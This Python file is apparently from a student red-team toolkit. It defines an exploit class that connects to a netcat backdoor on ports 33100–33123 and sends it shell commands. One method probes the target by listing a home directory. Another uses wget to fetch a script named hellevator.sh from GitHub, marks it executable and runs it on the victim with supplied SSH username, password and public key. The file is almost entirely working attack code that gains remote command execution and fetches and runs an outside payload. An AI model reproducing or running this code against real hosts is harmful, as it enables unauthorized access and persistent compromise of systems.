import socket
import BetterLogger
from BetterLogger import logger
from Exploit import Exploit, PatchedException


class BackdoorOneNC(Exploit):
    def __init__(self, ip_address, parsed_config) -> None:
        super().__init__(ip_address=ip_address, parsed_config=parsed_config)

    def run_command(self, command):
        for port in range(33123, 33100, -1):
            try:
                # logger.debug(f"{self.ip_address} - Connecting to port {port}...")
                socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket_connection.settimeout(3)
                socket_connection.connect((self.ip_address, port))
                socket_connection.settimeout(None)
                # logger.debug(f"{self.ip_address} - Successfully connected to port {port}.")

                # logger.debug(f"{self.ip_address} - Running command `{command}`...")
                socket_connection.sendall(command.encode())
                socket_connection.shutdown(socket.SHUT_WR)
                socket_response = ""
                while 1:
                    data = socket_connection.recv(1024)
                    if len(data) == 0:
                        break
                    socket_response = data.decode()
                socket_connection.close()
                # logger.debug(f"{self.ip_address} - The server responded with `{socket_response}`")
                return socket_response
            except Exception:
                # logger.debug(f"Failed to connect to port {port}.")
                continue
        raise PatchedException()

    def run_hellevator(self):
        try:
            logger.info(f"{self.ip_address} - Running Hellevator via BackdoorOneNC...")

            username = self.parsed_config["ssh_username"]
            password = self.parsed_config["ssh_password"]
            ssh_key = self.parsed_config["ssh_public_key"]
            download_hellevator_command = f"wget -O hellevator.sh https://raw.githubusercontent.com/joshmcorreia/SDSU_Cyber_Security_Red_Team/main/hellevator.sh && chmod +x hellevator.sh && ./hellevator.sh -u '{username}' -p '{password}' -s '{ssh_key}'"

            socket_response = self.run_command(command=download_hellevator_command)
            if ssh_key in socket_response:
                logger.info(f"{BetterLogger.COLOR_BLUE}{self.ip_address} - Successfully executed Hellevator via BackdoorOneNC!{BetterLogger.COLOR_END}")
                return True
            logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while executing Hellevator via BackdoorOneNC!{BetterLogger.COLOR_END}")
            return False
        except PatchedException:
            logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to BackdoorOneNC.{BetterLogger.COLOR_END}")
            return False
        except Exception as err:
            logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while executing Hellevator via BackdoorOneNC.{BetterLogger.COLOR_END}")
            logger.exception(err)
            return False

    def test_if_vulnerable(self):
        try:
            logger.info(f"{self.ip_address} - Testing if the target is vulnerable to BackdoorOneNC...")
            exploit_command = "ls /home/elliot"
            socket_response = self.run_command(command=exploit_command)
            if "Desktop" in socket_response:
                logger.info(f"{BetterLogger.COLOR_GREEN}{self.ip_address} - The target is vulnerable to BackdoorOneNC!{BetterLogger.COLOR_END}")
                return True
            logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to BackdoorOneNC.{BetterLogger.COLOR_END}")
            return False
        except PatchedException:
            logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to BackdoorOneNC.{BetterLogger.COLOR_END}")
            return False
        except Exception as err:
            logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while checking if BackdoorOneNC is vulnerable.{BetterLogger.COLOR_END}")
            logger.exception(err)
            return False
